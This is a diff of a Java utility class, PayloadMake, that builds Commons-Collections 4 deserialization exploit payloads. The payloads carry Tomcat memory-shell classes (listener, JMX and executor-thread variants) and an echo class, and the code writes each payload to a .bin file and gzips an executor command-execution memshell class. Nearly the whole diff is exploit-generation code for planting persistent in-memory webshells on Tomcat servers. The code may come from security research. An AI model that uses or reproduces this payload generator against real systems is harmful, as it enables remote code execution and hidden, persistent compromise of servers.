@@ -1,22 +1,19 @@
 package com.demo.utils;
 
 import com.demo.echo.TomcatEcho;
-import com.demo.memshell.all.TomcatExecThreadListener;
-import com.demo.memshell.exec.TomcatFilterThreadMS;
+import com.demo.memshell.exec.TomcatListenerJMXMS;
 import com.demo.memshell.exec.TomcatListenerThreadMS;
-import com.demo.memshell.exec.TomcatListenerWebAppMS;
-import com.demo.memshell.exec.TomcatServletThreadMS;
-import com.demo.memshell.unload.UnloadTomcatFilterThreadMS;
-import com.demo.memshell.unload.UnloadTomcatListenerThreadMS;
-import com.demo.memshell.unload.UnloadTomcatServletThreadMS;
-import org.ppp.tools.ser.CC4Generator;
-
-import java.util.ArrayList;
-import java.util.List;
-
+import com.demo.memshell.exec.executor.TomcatExecutorThreadLoader;
+import com.demo.memshell.test.ThreadLoader;
 import me.gv7.tools.josearcher.entity.Blacklist;
 import me.gv7.tools.josearcher.entity.Keyword;
 import me.gv7.tools.josearcher.searcher.SearchRequstByBFS;
+import org.ppp.tools.ser.CC4Generator;
+import org.ppp.tools.ser.GZIPMaker;
+
+
+import java.util.ArrayList;
+import java.util.List;
 
 /**
  * @author Whoopsunix
@@ -28,10 +25,44 @@ public class PayloadMake {
 
     public static void cc4() throws Exception {
         Class msmClass = TomcatEcho.class;
+        System.out.println(msmClass.getName());
         CC4Generator cc4Generator = new CC4Generator();
         String payload = cc4Generator.make(msmClass);
         System.out.println(payload.length());
-        cc4Generator.makeFile(msmClass, "cc4.bin");
+        cc4Generator.makeFile(msmClass, String.format("dev/%s.bin", msmClass.getSimpleName()));
+
+        msmClass = TomcatListenerJMXMS.class;
+        System.out.println(msmClass.getName());
+        cc4Generator = new CC4Generator();
+        payload = cc4Generator.make(msmClass);
+        System.out.println(payload.length());
+        cc4Generator.makeFile(msmClass, String.format("dev/%s.bin", msmClass.getSimpleName()));
+
+        msmClass = TomcatListenerThreadMS.class;
+        System.out.println(msmClass.getName());
+        cc4Generator = new CC4Generator();
+        payload = cc4Generator.make(msmClass);
+        System.out.println(payload.length());
+        cc4Generator.makeFile(msmClass, String.format("dev/%s.bin", msmClass.getSimpleName()));
+
+        msmClass = TomcatExecutorThreadLoader.class;
+        System.out.println(msmClass.getName());
+        cc4Generator = new CC4Generator();
+        payload = cc4Generator.make(msmClass);
+        System.out.println(payload.length());
+        cc4Generator.makeFile(msmClass, String.format("dev/%s.bin", msmClass.getSimpleName()));
+        GZIPMaker.gzipMaker("com.demo.memshell.exec.executor.ExecutorExecMS");
+
+
+        // test
+//        msmClass = ThreadLoader.class;
+//        System.out.println(msmClass.getName());
+//        cc4Generator = new CC4Generator();
+//        payload = cc4Generator.make(msmClass);
+//        System.out.println(payload.length());
+//        cc4Generator.makeFile(msmClass, "dev/test.bin");
+//        GZIPMaker.gzipMaker("com.demo.memshell.test.ExecutorExecMS");
+
     }
 
     public void searchTomcat() {
